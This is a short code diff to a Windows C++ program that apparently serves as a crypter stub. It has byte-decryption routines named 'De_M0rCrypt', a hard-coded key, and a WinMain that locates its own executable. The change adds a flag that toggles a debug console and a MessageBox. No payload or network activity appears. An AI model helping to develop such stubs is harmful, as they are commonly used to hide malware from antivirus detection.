@@ -21,12 +21,19 @@ char De_M0rCryptByte(char plainByte, const char* inputKey, std::size_t size);
 unsigned char* De_M0rCryptData(unsigned char* plainData, std::size_t size, const char* inputKey, std::size_t keySize);
 
 unsigned char decryptionKey[101] = "c";
+char alloc_console[] = "alloc_console 0";
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-	//AllocConsole();
-	//freopen("CONOUT$", "w", stdout);
-	//freopen("CONIN$", "r", stdin);
+	if (alloc_console[14] == '1')
+	{
+		AllocConsole();
+		freopen("CONOUT$", "w", stdout);
+		freopen("CONIN$", "r", stdin);
+	}
+	char* buffer[256];
+	memcpy(&buffer, &alloc_console, 16);
+	MessageBox(NULL, alloc_console, "", MB_OK);
 
 	HMODULE hModule = GetModuleHandle(NULL); // Mevcut modülün tanıtıcısını alır
 	char dosyaAdi[MAX_PATH];
